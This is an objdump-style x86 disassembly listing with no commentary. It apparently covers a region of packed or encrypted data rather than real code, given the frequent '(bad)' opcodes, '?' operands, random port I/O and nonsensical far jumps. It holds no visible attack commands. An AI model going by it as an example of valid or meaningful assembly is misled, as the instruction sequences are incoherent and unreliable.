  4387f8:	fcmovbe st,st(5)
  4387fa:	lahf   
  4387fb:	jg     0x43884b
  4387fd:	add    BYTE PTR [edx+0x70],ah
  438800:	jmp    0x17e4:0x3a6013e3
  438807:	add    BYTE PTR [ebx],dh
  438809:	test   eax,0x268be9fa
  43880e:	or     al,0xf9
	...
  43882c:	add    BYTE PTR [eax],al
  43882e:	movd   DWORD PTR [ebp+0x52000ee9],mm2
  438835:	bound  esi,QWORD PTR [esi-0x4038a55f]
  43883b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43883c:	xchg   BYTE PTR [ecx+0x6d0ad294],ah
  438842:	xchg   edi,eax
  438843:	test   eax,0x97c3e9fa
  438848:	or     DWORD PTR [edi+0x2d7ea69e],esi
  43884e:	xor    eax,0xc00ffadd
  438853:	cmp    al,0x24
  438855:	leave  
  438856:	mov    ecx,0xe4d12444
  43885b:	cmp    BYTE PTR [edi+0x4280c5f4],0xe5
  438862:	lea    eax,[edx+0x10]
  438865:	sbb    BYTE PTR [edx+0x71d10fa1],dl
  43886b:	lods   al,BYTE PTR ds:[esi]
  43886c:	(bad)  
  43886d:	call   0x56f4e018
  438872:	mov    esi,0xb764ef81
  438877:	xor    ecx,DWORD PTR [eax+eax*1]
  43887a:	mov    WORD PTR [edx+edi*8-0x1],?
  43887e:	hlt    
  43887f:	(bad)  
  438880:	mov    BYTE PTR [eax+edx*1-0x5c],al
  438884:	loope  0x4388b5
  438886:	cmp    DWORD PTR [eax],edi
  438888:	and    al,0x24
  43888a:	xchg   esp,eax
  43888b:	jg     0x4388cb
  43888d:	and    al,0xc
  43888f:	push   esp
  438890:	add    esi,0x0
	...
  4388af:	add    BYTE PTR [esp+ebx*1],cl
  4388b2:	ret    0xbff
  4388b5:	inc    esi
  4388b6:	pop    esi
  4388b7:	mov    DWORD PTR [eax-0x60],esp
  4388ba:	push   ds
  4388bb:	call   0x395553
  4388c0:	das    
  4388c1:	inc    eax
  4388c2:	and    al,0x18
  4388c4:	xor    DWORD PTR [ebx+0x6e],ebp
  4388c7:	or     ebx,DWORD PTR [edi]
  4388c9:	add    al,0x62
  4388cb:	add    DWORD PTR [ebx+0xc],ebp
  4388ce:	jnp    0x438934
  4388d0:	adc    ah,bh
  4388d2:	jmp    FWORD PTR [ecx+0x64]
  4388d5:	or     al,BYTE PTR [ecx]
  4388d7:	lea    esp,[eax]
  4388d9:	cwde   
  4388da:	inc    edx
  4388db:	push   eax
  4388dc:	stc    
  4388dd:	lock and edi,DWORD PTR [eax]
  4388e0:	dec    esp
  4388e1:	pop    edi
  4388e2:	nop
  4388e3:	(bad)  
  4388e4:	stos   DWORD PTR es:[edi],eax
  4388e5:	push   ecx
  4388e6:	call   0xf5b11d27
  4388eb:	xor    ecx,DWORD PTR [edi+0x29]
  4388ee:	aas    
  4388ef:	and    al,0x28
  4388f1:	sub    DWORD PTR [ebx+0x4],ebp
  4388f4:	scas   eax,DWORD PTR es:[edi]
  4388f5:	mov    ch,0x81
  4388f7:	into   
  4388f8:	pushf  
  4388f9:	cmp    ch,bh
  4388fb:	(bad)  
  4388fc:	stos   DWORD PTR es:[edi],eax
  4388fd:	sub    ebx,esi
  4388ff:	cmp    ebx,DWORD PTR [edi-0x54bd7b03]
  438905:	ins    DWORD PTR es:[edi],dx
  438906:	cmc    
  438907:	mul    BYTE PTR [eax-0x60]
  43890a:	push   cs
  43890b:	adc    al,ah
  43890d:	xor    al,0x8d
  43890f:	inc    esp
  438910:	or     eax,0x4ffff5
	...
  438931:	add    BYTE PTR [ebp+edx*2-0x6e1af01e],al
  438938:	lods   eax,DWORD PTR ds:[esi]
  438939:	cld    
  43893a:	jmp    0xe541:0x2173bf1d
  438941:	(bad)  
  438942:	fcom   st(6)
  438944:	add    edi,0x2443302d
  43894a:	sbb    eax,0x1d244314
  43894f:	imul   ebx,DWORD PTR [ecx+eax*1],0xe8469d27
  438956:	popa   
  438957:	cdq    
  438958:	mov    al,0xfa
  43895a:	stos   BYTE PTR es:[edi],al
  43895b:	sub    eax,0xbab50be3
  438960:	call   0xb320:0x1a9afc
  438967:	fiadd  DWORD PTR [ebx]
  438969:	adc    ch,dh
  43896b:	cwde   
  43896c:	(bad)  
  43896d:	dec    DWORD PTR [ebp-0x2676e7bd]
  438973:	cld    
  438974:	pop    ss
  438975:	sti    
  438976:	sbb    cl,bl
  438978:	pop    ss
  438979:	inc    eax
  43897a:	or     eax,0x11243814
  43897f:	rol    DWORD PTR [eax-0x5],0x58
  438983:	push   esi
  438984:	pushf  
  438985:	dec    esp
  438986:	pop    ebx
  438987:	aad    0xe7
  438989:	adc    edx,DWORD PTR ds:0xbae8030d
  43898f:	test   eax,0xdd43fab0
  438994:	out    0x13,eax
	...
  4389b2:	add    BYTE PTR [eax],al
  4389b4:	push   cs
  4389b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4389b6:	call   0x4475d722
  4389bb:	add    BYTE PTR ds:0x1afb21a0,dh
  4389c1:	and    cl,BYTE PTR [eax+0x24]
  4389c4:	stc    
  4389c5:	call   eax
  4389c7:	add    ecx,DWORD PTR ds:0xead36900
  4389cd:	or     BYTE PTR [eax+0x3],0x5d
  4389d1:	sbb    ch,al
  4389d3:	push   esp
  4389d4:	inc    edx
  4389d5:	push   ebx
  4389d6:	inc    edx
  4389d7:	pop    ss
  4389d8:	jno    0x4389ea
  4389da:	test   eax,0x3b0bea03
  4389df:	dec    eax
  4389e0:	xor    DWORD PTR [eiz*8-0x16e7ffc9],ecx
  4389e7:	add    ecx,DWORD PTR ds:0xc6178e80
  4389ed:	or     al,0xa9
  4389ef:	pop    ss
  4389f0:	dec    ebp
  4389f1:	add    BYTE PTR [esi+0x40],bl
  4389f4:	jmp    0x1f004800
  4389f9:	cli    
  4389fa:	ins    DWORD PTR es:[edi],dx
  4389fb:	add    ebp,DWORD PTR [ebx]
  4389fd:	add    edx,esi
  4389ff:	adc    eax,DWORD PTR [ebx+eax*2+0x3b800bc5]
  438a06:	or     eax,0x24bedd4c
  438a0b:	call   0x449e7a42
  438a10:	or     eax,0x12e824bf
  438a15:	push   esp
  438a16:	xor    eax,0x44
	...
  438a33:	add    BYTE PTR [eax],al
  438a35:	add    BYTE PTR ds:0x1317d3a7,cl
  438a3b:	inc    eax
  438a3c:	jmp    0x5e8e4191
  438a41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438a42:	mov    cl,0xc2
  438a44:	call   0x8a59:0xe7fbf147
  438a4b:	mov    al,0xa9
  438a4d:	or     DWORD PTR [ecx+0x32],ebp
  438a50:	sub    DWORD PTR [ecx+edi*4],eax
  438a53:	std    
  438a54:	sbb    bl,BYTE PTR [ebp+esi*8-0x744f864a]
  438a5b:	mov    ebp,0x25316ff
  438a60:	add    BYTE PTR [edx],bl
  438a62:	mov    bh,0x7e
  438a64:	out    dx,eax
  438a65:	mov    esi,0x2f866601
  438a6a:	stc    
  438a6b:	into   
  438a6c:	cs push esi
  438a6e:	xchg   esi,eax
  438a6f:	out    0xfb,al
  438a71:	dec    edi
  438a72:	mov    ebp,0xfebdbeee
  438a77:	jl     0x438a42
  438a79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438a7a:	xchg   dl,dh
  438a7c:	sti    
  438a7d:	aaa    
  438a7e:	popf   
  438a7f:	out    dx,al
  438a80:	mov    esi,0xf6ee9ab4
  438a85:	pushf  
  438a86:	adc    dh,BYTE PTR [eax+0x0]
  438a89:	adc    dh,bl
  438a8b:	jl     0x438a8e
  438a8d:	push   ss
  438a8e:	dec    BYTE PTR [ebx]
  438a90:	push   eax
  438a91:	add    DWORD PTR [edx-0x47],eax
  438a94:	cli    
  438a95:	push   es
  438a96:	sub    DWORD PTR [ebp+0xfa36],edx
	...
  438ab8:	fneni(8087 only) 
  438aba:	gs in  eax,dx
  438abc:	jbe    0x438a7e
  438abe:	leave  
  438abf:	out    dx,al
  438ac0:	(bad)  
  438ac1:	out    dx,al
  438ac2:	mov    esi,0x1777155d
  438ac7:	ror    BYTE PTR [edi],cl
  438ac9:	aad    0xbf
  438acb:	adc    cl,BYTE PTR [esi+0x31]
  438ace:	add    ah,BYTE PTR [eax+0x79]
  438ad1:	jle    0x438aca
  438ad3:	shr    BYTE PTR [ecx+0x4f],cl
  438ad6:	call   0xfaee2e81
  438adb:	cli    
  438adc:	stos   DWORD PTR es:[edi],eax
  438add:	out    dx,al
  438ade:	div    BYTE PTR [eax*1-0x2f6d402a]
  438ae5:	sbb    eax,0xb79b9108
  438aea:	cli    
  438aeb:	xchg   esi,eax
  438aec:	es data16 jae 0x438ad2
  438af0:	dec    ebx
  438af1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438af2:	add    BYTE PTR [eax],0xa0
  438af5:	cmp    eax,DWORD PTR [eax]
  438af7:	mov    DWORD PTR [eax+edi*8],ecx
  438afa:	loop   0x438afe
  438afc:	push   edi
  438afd:	shl    DWORD PTR [ecx],0xc3
  438b00:	sbb    DWORD PTR [esi+0x7a5c37f5],esp
  438b06:	enter  0x63ff,0x4d
  438b0a:	call   0xf598bda3
  438b0f:	jmp    0x438b46
  438b11:	sub    ebx,ebp
  438b13:	call   0x397ebf
  438b18:	xadd   DWORD PTR [esi+0x9],ebp
	...
  438b38:	add    BYTE PTR [eax],al
  438b3a:	je     0x438b6d
  438b3c:	add    bh,bh
  438b3e:	mov    ecx,0xb4400afc
  438b43:	es mov edx,0xbb39825f
  438b49:	mov    al,0xa5
  438b4b:	mov    esi,0x381a000a
  438b50:	and    al,0x4
  438b52:	mov    ch,0x4a
  438b54:	xor    ecx,0xffffffeb
  438b57:	std    
  438b58:	mov    ds:0x7400648c,eax
  438b5d:	push   es
  438b5e:	jp     0x438ae8
  438b60:	pop    ebx
  438b61:	into   
  438b62:	jae    0x438bb9
  438b64:	add    esi,0xfffec242
  438b6a:	out    dx,eax
  438b6b:	dec    edx
  438b6c:	jl     0x438af3
  438b6e:	mov    dh,0xec
  438b70:	pop    ss
  438b71:	mov    edi,DWORD PTR [edx]
  438b73:	add    al,0x83
  438b75:	dec    esi
  438b76:	enter  0x5051,0x51
  438b7a:	dec    esp
  438b7b:	sbb    al,0x89
  438b7d:	(bad)  
  438b7e:	mov    ds:0x28684099,eax
  438b83:	imul   DWORD PTR [esi+0x29]
  438b86:	mov    ebp,0xd8b683a
  438b8b:	adc    eax,0x9632ff7f
  438b90:	xchg   DWORD PTR [edi-0x768a605f],edi
  438b96:	mov    DWORD PTR [esi+0x7c2fffe],edx
  438b9c:	cmp    DWORD PTR [ecx+0x0],0x0
	...
  438bbb:	add    BYTE PTR [ecx+0x1172ab06],ch
  438bc1:	push   ecx
  438bc2:	dec    esp
  438bc3:	outs   dx,DWORD PTR ds:[esi]
  438bc4:	add    eax,DWORD PTR [ebx+0x4a]
  438bc7:	test   ebp,ecx
  438bc9:	(bad)  
  438bcc:	or     al,0xd6
  438bce:	lock mov edi,0xeb7584ce
  438bd4:	xchg   esi,eax
  438bd5:	pop    esp
  438bd6:	not    BYTE PTR [ecx-0x7a]
  438bd9:	call   0x6d78cdc3
  438bde:	adc    BYTE PTR [edi-0x8a5ab0],al
  438be4:	or     eax,0xbaff771b
  438be9:	cdq    
  438bea:	outs   dx,BYTE PTR ds:[esi]
  438beb:	add    BYTE PTR [eax+eiz*4+0x160d0003],ah
  438bf2:	sub    eax,0xae2d0d74
  438bf7:	xchg   BYTE PTR [eax-0x3b],dl
  438bfa:	dec    ebp
  438bfb:	xchg   ebp,esi
  438bfd:	mov    DWORD PTR [ebp+0x7c],esi
  438c00:	sbb    eax,0x74082b30
  438c05:	jo     0x438c0a
  438c07:	add    BYTE PTR ds:0x574ace6,cl
  438c0d:	inc    esp
  438c0e:	inc    edx
  438c0f:	cmp    BYTE PTR [ebp+0x7518422b],bh
  438c15:	pop    es
  438c16:	lahf   
  438c17:	stc    
  438c18:	pop    edx
  438c19:	cwde   
  438c1a:	inc    ecx
  438c1b:	or     BYTE PTR [esi],ah
  438c1d:	xchg   ecx,eax
  438c1e:	jne    0x438c61
	...
  438c3c:	add    BYTE PTR [eax],al
  438c3e:	cli    
  438c3f:	dec    esp
  438c41:	sub    al,0xb9
  438c43:	neg    esp
  438c45:	or     BYTE PTR [esi],al
  438c47:	jge    0x438bff
  438c49:	add    al,0xd
  438c4b:	add    BYTE PTR [ebp-0x3c],ah
  438c4e:	pop    ss
  438c4f:	jl     0x438cb4
  438c51:	add    al,0xd
  438c53:	add    BYTE PTR [esi+0x46],ch
  438c56:	mov    eax,ds:0x9c382137
  438c5b:	aaa    
  438c5c:	and    ebp,edi
  438c5e:	xchg   ecx,eax
  438c5f:	jnp    0x438c49
  438c61:	add    ecx,DWORD PTR ds:0x61ba2e9
  438c67:	jl     0x438bff
  438c69:	add    al,0xd
  438c6b:	add    BYTE PTR [esi-0x66079e54],dh
  438c71:	lods   al,BYTE PTR ds:[esi]
  438c72:	stc    
  438c73:	xor    edx,ebx
  438c75:	inc    ebx
  438c76:	or     eax,0x5217ab77
  438c7b:	mov    esp,0x79227adc
  438c80:	mov    ds:0x19e0aafb,eax
  438c85:	lods   eax,DWORD PTR ds:[esi]
  438c86:	mov    bh,0x7b
  438c88:	sub    ch,bh
  438c8a:	mov    ?,WORD PTR [edx-0x18]
  438c8d:	add    ecx,DWORD PTR ds:0x247ee816
  438c93:	sbb    al,0x91
  438c95:	arpl   WORD PTR [esi+0x1face93f],ax
  438c9b:	cld    
  438c9c:	add    BYTE PTR [edi-0x791e5e08],cl
	...
  438cbe:	add    BYTE PTR [eax],al
  438cc0:	ret    0x602b
  438cc3:	lods   eax,DWORD PTR ds:[esi]
  438cc4:	cld    
  438cc5:	pop    ds
  438cc6:	pop    esi
  438cc7:	inc    ebp
  438cc8:	in     eax,0xa2
  438cca:	push   edx
  438ccb:	push   eax
  438ccc:	xchg   edx,eax
  438ccd:	or     ch,BYTE PTR [esi+0x3e]
  438cd0:	adc    DWORD PTR [eax-0x5da9d659],ebx
  438cd6:	jmp    FWORD PTR [esi+ecx*2+0x2e]
  438cda:	pop    esi
  438cdb:	push   0xfffffff1
  438cdd:	sti    
  438cde:	push   DWORD PTR [ecx-0xd]
  438ce1:	movnti DWORD PTR [edi],esp
  438ce4:	cmc    
  438ce5:	cld    
  438ce6:	(bad)  
  438ce7:	call   0x625a27fa
  438cec:	shl    BYTE PTR [edi],1
  438cee:	daa    
  438cef:	scas   al,BYTE PTR es:[edi]
  438cf0:	fimul  DWORD PTR [ebx]
  438cf2:	sti    
  438cf3:	imul   esi
  438cf5:	jp     0x438d43
  438cf7:	in     eax,0x61
  438cf9:	xor    BYTE PTR [edx+eiz*2-0x1f],bl
  438cfd:	cdq    
  438cfe:	xchg   ecx,eax
  438cff:	jecxz  0x438cb2
  438d01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438d02:	sub    DWORD PTR [ecx],0x42
  438d05:	in     eax,dx
  438d06:	gs jmp 0x415bc47f
  438d0c:	dec    esp
  438d0d:	lods   al,BYTE PTR ds:[esi]
  438d0e:	stc    
  438d0f:	inc    esi
  438d10:	mov    ecx,edx
  438d12:	or     ah,BYTE PTR [ecx+edi*4-0x5a]
  438d16:	cli    
  438d17:	ss push ebp
  438d19:	aas    
  438d1a:	je     0x438d86
  438d1c:	jbe    0x438d1e
  438d1e:	jp     0x438d13
  438d20:	lea    ebp,[ecx+0x9c04]
	...
  438d42:	adc    edi,DWORD PTR [ecx+0x44]
  438d45:	std    
  438d46:	scas   eax,DWORD PTR es:[edi]
  438d47:	or     DWORD PTR [eax+0x1949],edi
  438d4d:	ret    0x1848
  438d50:	push   ss
  438d51:	sub    DWORD PTR [eax+0x61],ebp
  438d54:	pop    edx
  438d55:	xchg   edx,eax
  438d56:	inc    eax
  438d57:	inc    ebx
  438d58:	mov    esi,0xbfd20ed9
  438d5d:	sar    BYTE PTR [edx+edx*8+0x3ff829bf],cl
  438d64:	ins    BYTE PTR es:[edi],dx
  438d65:	stos   BYTE PTR es:[edi],al
  438d66:	fistp  QWORD PTR [eax-0x10]
  438d69:	push   0x37
  438d6b:	adc    al,0xff
  438d6d:	jmp    DWORD PTR [ecx]
  438d6f:	clc    
  438d70:	dec    esi
  438d71:	push   0x66
  438d73:	sub    BYTE PTR [ecx+0x5c],bh
  438d76:	int3   
  438d77:	dec    edi
  438d78:	jns    0x438dba
  438d7a:	xor    al,0x56
  438d7c:	ins    DWORD PTR es:[edi],dx
  438d7d:	add    al,0x9c
  438d7f:	push   ebx
  438d80:	outs   dx,DWORD PTR ds:[esi]
  438d81:	(bad)  
  438d82:	fwait
  438d83:	xor    eax,0x11c085
  438d88:	sub    al,al
  438d8a:	cli    
  438d8b:	mov    eax,0xe5990164
  438d90:	rdrand edx
  438d93:	pop    es
  438d94:	add    al,0x0
  438d96:	and    al,0xfd
  438d98:	out    0xd4,eax
  438d9a:	xchg   DWORD PTR [esi-0xb],edx
  438d9d:	mov    al,0xf5
  438d9f:	ss mov ebx,0x816b7f56
  438da5:	inc    esi
	...
  438dc2:	add    BYTE PTR [eax],al
  438dc4:	enter  0x4ee4,0x74
  438dc8:	adc    esp,esp
  438dca:	inc    edi
  438dcb:	jne    0x438ddc
  438dcd:	add    bh,dl
  438dcf:	mov    WORD PTR [edx-0x62ab97c8],ds
  438dd5:	cmp    al,0x0
  438dd7:	inc    DWORD PTR [ebx-0x5a441d60]
  438ddd:	push   esi
  438dde:	cmc    
  438ddf:	test   esp,esp
  438de1:	out    dx,al
  438de2:	add    esi,DWORD PTR [edx]
  438de4:	in     al,0x80
  438de6:	xor    al,0xc7
  438de8:	jb     0x438df2
  438dea:	cli    
  438deb:	push   DWORD PTR [esp+edi*8+0x401f18e2]
  438df2:	and    al,0xc
  438df4:	mov    ?,ebx
  438df6:	mov    WORD PTR [esi+0x64],cs
  438df9:	and    eax,DWORD PTR [ecx+0x70]
  438dfc:	mov    bl,0x3e
  438dfe:	ins    BYTE PTR es:[edi],dx
  438dff:	add    ah,BYTE PTR [esp+edi*8-0x1]
  438e03:	out    0xd,eax
  438e05:	adc    dh,BYTE PTR [edx+0x2ab16af9]
  438e0b:	and    al,0xfd
  438e0d:	sub    ebp,DWORD PTR [ecx]
  438e0f:	pop    esp
  438e10:	pop    edx
  438e11:	jmp    0xe7ff:0xe1520fdf
  438e18:	retf   0xa5e7
  438e1b:	cli    
  438e1c:	cmp    bh,BYTE PTR [esi-0x41bd3ff7]
  438e22:	inc    ebp
  438e23:	pop    edx
  438e24:	dec    edi
  438e25:	sahf   
  438e26:	(bad)  
  438e27:	push   ecx
	...
  438e44:	add    BYTE PTR [eax],al
  438e46:	xchg   esi,eax
  438e47:	xchg   DWORD PTR [ecx+0x41],edi
  438e4a:	mov    cl,0xee
  438e4c:	cmp    edx,DWORD PTR [ebx-0x60]
  438e4f:	mov    bh,0x1c
  438e51:	inc    BYTE PTR [ecx+0x656842a8]
  438e57:	nop
  438e58:	add    BYTE PTR ds:[edx],al
  438e5b:	mov    edi,0xb862e7fa
  438e60:	test   al,0xfa
  438e62:	mov    cl,ch
  438e64:	das    
  438e65:	add    al,0x1f
  438e67:	jmp    0x700dae05
  438e6c:	adc    bh,bh
  438e6e:	fisubr DWORD PTR [ecx+0xd59fafe]
  438e74:	adc    al,0x8d
  438e76:	dec    ebx
  438e77:	lea    esp,[ebp-0x5a67168d]
  438e7d:	jb     0x438e90
  438e7f:	icebp  
  438e80:	out    dx,eax
  438e81:	jo     0x438e36
  438e83:	imul   BYTE PTR [ebp-0x5216f929]
  438e89:	xlat   BYTE PTR ds:[ebx]
  438e8a:	inc    edx
  438e8b:	les    eax,FWORD PTR [bx]
  438e8e:	or     eax,0x80535178
  438e93:	pop    ss
  438e94:	imul   DWORD PTR [esi]
  438e96:	dec    ebp
  438e97:	out    0x0,al
  438e99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438e9a:	xchg   ecx,eax
  438e9b:	add    BYTE PTR [ecx],ch
  438e9d:	add    al,0x65
  438e9f:	std    
  438ea0:	jo     0x438e4b
  438ea2:	ja     0x438e2f
  438ea4:	sub    al,0xe0
  438ea6:	(bad)  
  438ea7:	shr    BYTE PTR [ebp+0xc1],cl
	...
  438ec5:	add    BYTE PTR [eax],al
  438ec7:	add    BYTE PTR [esp+ebp*2],cl
  438eca:	je     0x438f10
  438ecc:	or     eax,0x866fe1c7
  438ed1:	inc    eax
  438ed2:	jmp    0x60677351
  438ed7:	dec    edx
  438ed8:	mov    ch,0x88
  438eda:	inc    edx
  438edb:	sbb    BYTE PTR [esi+0x46],cl
  438ede:	sbb    DWORD PTR [ecx+ecx*1],eax
  438ee1:	add    cl,ch
  438ee3:	sbb    eax,0x4c228910
  438ee8:	lds    ecx,FWORD PTR [eax+0x3e84302a]
  438eee:	std    
  438eef:	jp     0x438f65
  438ef1:	sub    al,0x3
  438ef4:	or     eax,0x2804a89
  438ef9:	lahf   
  438efa:	call   0xe8cb2379
  438eff:	add    ecx,DWORD PTR ds:0x1adfb4d9
  438f05:	adc    al,0xf0
  438f07:	push   ebx
  438f08:	out    0x13,al
  438f0a:	or     eax,0xf9468810
  438f0f:	push   ebx
  438f10:	add    BYTE PTR [esi-0x27],0x9b
  438f14:	push   ss
  438f15:	mov    edi,0x9843a92a
  438f1a:	jmp    0x438f4b
  438f1c:	mov    edx,0x562fba87
  438f21:	mov    ebp,DWORD PTR [edx]
  438f23:	dec    ebp
  438f24:	inc    esp
  438f25:	ret    0x3e0
  438f28:	aas    
  438f29:	mov    esi,edi
  438f2b:	fwait
	...
  438f48:	add    BYTE PTR [eax],al
  438f4a:	or     eax,DWORD PTR [eax]
  438f4c:	jmp    0x872e54
  438f51:	int    0x86
  438f53:	push   DWORD PTR [ebx-0x19]
  438f56:	fsub   QWORD PTR [edi-0x665a4da5]
  438f5c:	xchg   BYTE PTR [edi-0x16fca23c],ah
  438f62:	mov    ch,0x50
  438f64:	jg     0x438f4f
  438f66:	push   cs
  438f67:	add    bl,al
  438f69:	out    dx,eax
  438f6a:	ret    0x3f8a
  438f6d:	jmp    0x7d4bcfbf
  438f72:	ret    0xffde
  438f75:	shl    BYTE PTR [eax*8+0x1065a6fa],0x64
  438f7d:	xchg   ecx,eax
  438f7e:	cmp    al,0xc5
  438f80:	cli    
  438f81:	xchg   esi,eax
  438f82:	dec    ebp
  438f83:	inc    eax
  438f84:	or     BYTE PTR [ecx-0x52002160],cl
  438f8a:	or     al,0x64
  438f8c:	mov    ebp,DWORD PTR [ecx]
  438f8e:	or     DWORD PTR [edi+0x54],ebx
  438f91:	bound  esp,QWORD PTR [edx+0x3b625130]
  438f97:	or     al,0x4f
  438f99:	mov    edi,0x7a60a85d
  438f9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438f9f:	call   0x60ef:0x84fea486
  438fa6:	xor    ebx,DWORD PTR [edi+eiz*8-0x5657e63]
  438fad:	jb     0x438faf
	...
  438fcb:	add    BYTE PTR [ebx],ch
  438fcd:	or     BYTE PTR [ecx-0xe7b8954],cl
  438fd3:	mov    ch,0x51
  438fd5:	mov    eax,DWORD PTR [ebx-0x27]
  438fd8:	mov    ebx,0xe699a8c
  438fdd:	add    BYTE PTR [eax],al
  438fdf:	mov    ecx,0x9be7ae29
  438fe4:	pusha  
  438fe5:	call   0x456e:0xc12800fa
  438fec:	xchg   ebx,eax
  438fed:	jmp    0x438fea
  438fef:	mov    edi,DWORD PTR [edi-0x10f38c98]
  438ff5:	lods   eax,DWORD PTR ds:[esi]
  438ff6:	inc    esi
  438ff7:	push   ss
  438ff8:	and    al,0x4
  438ffa:	dec    edi
  438ffb:	(bad)  
  438ffc:	mov    edx,0x43fc7d01
  439001:	iret   
  439002:	mul    DWORD PTR [esi-0x55]
  439005:	popf   
  439006:	xor    al,0x20
  439008:	push   ebx
  439009:	iret   
  43900a:	jae    0xff9292bb
  439010:	stos   BYTE PTR es:[edi],al
  439011:	add    DWORD PTR [ebp-0x8],edi
  439014:	scas   eax,DWORD PTR es:[edi]
  439015:	or     BYTE PTR ds:[esi+0x6b],ah
  439019:	popf   
  43901a:	or     ecx,DWORD PTR [edx]
  43901c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43901d:	mov    edi,0x27b8312
  439022:	mov    esi,0x31ba3407
  439027:	mov    esp,ecx
  439029:	jg     0x439025
  43902b:	jmp    DWORD PTR [ecx+edx*1]
  43902e:	add    bl,ch
	...
  43904c:	add    BYTE PTR [eax],al
  43904e:	aad    0x65
  439050:	lods   eax,DWORD PTR ds:[esi]
  439051:	xor    ah,0x0
  439054:	add    al,ch
  439056:	(bad)  
  439057:	pop    ecx
  439058:	cmc    
  439059:	call   DWORD PTR [edi]
  43905b:	les    ebp,FWORD PTR [ecx]
  43905d:	leave  
  43905e:	std    
  43905f:	ds cld 
  439061:	mov    DWORD PTR [ebx-0x7c],ebp
  439064:	cli    
  439065:	jmp    esp
  439067:	sbb    edi,DWORD PTR [esi-0x7c]
  43906a:	in     al,0x0
  43906c:	add    BYTE PTR [edi],cl
  43906e:	push   0x9f5e55c4
  439073:	pop    ebx
  439074:	mov    esp,0xe781a40c
  439079:	or     BYTE PTR ds:0xdfff6ff,bl
  43907f:	not    BYTE PTR [eax-0x79]
  439082:	mov    cl,0x29
  439084:	cwde   
  439085:	dec    edi
  439086:	ds jge 0x4390d2
  439089:	das    
  43908a:	mov    dh,0x6e
  43908c:	sub    dh,BYTE PTR [ebp+ecx*8-0x5a]
  439090:	jnp    0x4390ee
  439092:	jne    0x439041
  439094:	pshufw mm3,QWORD PTR [edi],0xe7
  439098:	add    ecx,DWORD PTR [ecx-0x411aad38]
  43909e:	sbb    ch,BYTE PTR [ebx]
  4390a0:	sub    al,BYTE PTR [ecx]
  4390a2:	or     eax,0xe18016a7
  4390a7:	out    0x3,al
  4390a9:	push   eax
  4390aa:	push   edx
  4390ab:	mov    bl,0x56
  4390ad:	or     eax,0x44b9a6cd
	...
  4390ce:	add    BYTE PTR [eax],al
  4390d0:	dec    ecx
  4390d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4390d2:	(bad)  
  4390d3:	dec    DWORD PTR ds:0x84c84810
  4390d9:	(bad)  [edi-0x1aa93778]
  4390df:	mov    esi,0x1392312
  4390e4:	or     eax,0xc08d4da7
  4390e9:	bound  edx,QWORD PTR [ebx-0x73]
  4390ec:	pop    eax
  4390ed:	jno    0x439142
  4390ef:	sti    
  4390f0:	frstor [edi+edi*4]
  4390f3:	or     dl,BYTE PTR [eax+0xd0004fa]
  4390f9:	push   esi
  4390fa:	dec    ebp
  4390fb:	dec    edi
  4390fc:	jne    0x4390db
  4390fe:	jb     0x43913f
  439100:	or     eax,0xfdac104a
  439105:	push   0x10d586fe
  43910a:	sub    al,ah
  43910c:	push   es
  43910d:	into   
  43910e:	icebp  
  43910f:	or     DWORD PTR ds:0x62fffea8,0x0
  439116:	and    dl,BYTE PTR [eax]
  439118:	shl    eax,0xa8
  43911b:	add    edx,DWORD PTR [ebp+eax*2+0xb63ea11]
  439122:	gs sahf 
  439124:	call   0xe880:0x4d1be89b
  43912b:	add    ebx,edx
  43912d:	cs jg  0x439131
  439130:	cmc    
  439131:	jmp    FWORD PTR [ecx+0x3]
	...
  439150:	add    BYTE PTR [eax],al
  439152:	or     eax,0xd0fe22f
  439157:	cmc    
  439158:	sub    BYTE PTR [esp+edx*4],al
  43915b:	inc    ebp
  43915c:	fucomp st(1)
  43915e:	mov    ds:0xc9770914,eax
  439163:	dec    edi
  439164:	pop    ss
  439165:	push   esp
  439166:	push   esi
  439167:	cmc    
  439168:	and    al,0x10
  43916a:	int    0xff
  43916c:	imul   eax,esp,0xffffffbe
  43916f:	or     DWORD PTR [edi+edi*1+0x49],ebx
  439173:	xor    BYTE PTR [edx+0x28f4510f],ah
  439179:	add    al,0x90
  43917b:	rcr    BYTE PTR [ebx],0x1
  43917e:	xchg   esp,eax
  43917f:	cmp    eax,0xb7e17995
  439184:	fadd   DWORD PTR [ebx+0xd]
  439187:	es icebp 
  439189:	dec    esp
  43918a:	push   es
  43918b:	mov    dl,0xfe
  43918d:	stc    
  43918e:	pop    edi
  43918f:	mov    DWORD PTR [ebx],esp
  439191:	mov    ah,0xf7
  439193:	mov    cl,0xb8
  439195:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439196:	jns    0x439128
  439198:	outs   dx,DWORD PTR ds:[esi]
  439199:	aas    
  43919a:	icebp  
  43919b:	xor    dl,BYTE PTR [edx+0xf]
  43919e:	jmp    0x84473a92
  4391a3:	inc    esp
  4391a4:	push   ebp
  4391a5:	jmp    0x7902a53d
  4391aa:	add    DWORD PTR [eax-0x1],edx
  4391ad:	fmul   DWORD PTR [esi+0x0]
  4391b0:	push   eax
  4391b1:	cs jmp 0x0:0x3ffa97
	...
  4391d1:	add    BYTE PTR [eax],al
  4391d3:	add    BYTE PTR [esi],dh
  4391d5:	inc    esp
  4391d6:	fsubr  st(2),st
  4391d8:	int    0xe
  4391da:	pop    edx
  4391db:	sub    DWORD PTR [esi+0x3da9c69a],0xe206534b
  4391e5:	mov    ds:0x49be74fa,eax
  4391ea:	dec    edi
  4391eb:	div    BYTE PTR [ebx]
  4391ed:	cwde   
  4391ee:	cli    
  4391ef:	aam    0xae
  4391f1:	or     al,BYTE PTR [eax-0x17]
  4391f4:	repz pop edx
  4391f6:	jae    0x439218
  4391f8:	jbe    0x439235
  4391fa:	hlt    
  4391fb:	pop    ebp
  4391fc:	imul   eax,DWORD PTR [ecx+0x4b359d4c],0xb01372b4
  439206:	cli    
  439207:	xor    al,0x7d
  439209:	add    eax,0x4365a248
  43920e:	mov    eax,0x4f5af6de
